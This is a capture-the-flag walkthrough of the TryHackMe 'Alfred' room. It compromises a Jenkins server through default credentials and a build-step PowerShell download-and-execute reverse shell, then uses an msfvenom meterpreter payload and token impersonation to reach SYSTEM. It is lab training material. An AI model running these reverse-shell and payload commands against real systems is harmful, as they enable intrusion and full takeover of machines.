# Alfred

Link: [Alfred](https://tryhackme.com/room/alfred)

## High-Level Overview

Compromise a Windows machine running a Jenkins instance that isn't secured.

## Tools Needed

* Nmap
* Shells
* Netcat
* Metasploit

## Walkthrough

Initial recon scan with `nmap`:

```bash
$ nmap -sV -PS -sC MACHINE:IP
```

We have identified the following ports open:

* 80 - http?
* 3389 - ms-wbt-server?
* 8080 - tcpwrapped

Going to the URL `http://MACHINE:IP:8080/`, seems like we find a `Jenkins` instance running.

Doing a google search for `Jenkins` default credentials, it seems like this machine uses the default admin:admin credentials.

To get initial access on the machine, we explore the functionality of `Jenkins`. We are looking for a way to get remote code execution for this machine.

Clicking on the only available project, takes us to the link `http://MACHINE:IP:8080/job/project/configure`. If we scroll until we reach the `Build` section, we can see that we can issue Windows commands in this box. This is what we were looking for.

* On the attacking machine download the reverse shell exploit script and start a http server so the vulnerable machine can download the file. In a separate terminal windows create a nc listener:

```bash
# download the Invoke-PowerShellTcp.ps1 exploit
$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
# start a http server to serve the file to the jenkins instance
$ sudo python3 -m http.server 80
# in a different terminal open a nc listener to catch the reverse shell connection
$ rlwrap nc -lvnp 1234
```

* Add the following powershell commands below to the `Build` feature:

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://YOUR:VPN:IP:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress YOUR:VPN:IP -Port 1234
```

* Go back to the main page and click build now. You should get a reverse shell.

On the `nc` listenr we can `cd` into `C:\Users\bruce\Desktop` to get the first flag.

Now onto privilege escalation, we will rely on `metasploit`. First use `msfvenom` to generate a windows meterpreter reverse shell payload:

```bash
$ msfvenom \
    -p windows/meterpreter/reverse_tcp \
    -a x86 \
    --encoder x86/shikata_ga_nai \
    LHOST=YOUR:VPN:IP \
    LPORT=9002 \
    -f exe \
    -o shell.exe
```

To download the exploit on the machine, we can use the **EXISTING** reverse shell connection we got using the `Jenkins` build exploit, and inside that session run the command:

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://YOUR:VPN:IP:80/shell.exe','shell.exe')"
```

* We can now set up the handler in `metasploit`:

```bash
> use exploit/multi/handler
> set PAYLOAD windows/meterpreter/reverse_tcp
> set LHOST YOUR:VPN:IP
> set LPORT 9002
> run
```

* Then back inside the victim machine start the process with:

```powershell
> Start-Process "shell-name.exe"
```

* Now you have a shell connected and you can get to it by typing the following into `meterpreter`:

```bash
> shell
```

* Our listener now has a shell into the vulnerable Windows machine, and we can begin doing some recon work:

```bash
# check privileges
> whoami /priv
# background shell session and open meterpreter to issue commands
CTRL+Z
# can go back to the session using `channel -i 1`
> load incognito
# get the tokens we can impersonate
> list_tokens -g
> impersonate_token "BUILTIN\Administrators"
> getuid
# find process PID of services.exe
> ps | grep services.exe
# migrate process to PID of services.exe process
> migrate ps 668
# get back to the shell session
> shell
# we should be back now as system account and we can get the root flag
> cd config
> type root.txt
```

Getting the `root.txt` flag is what we needed for the final challenge for this machine.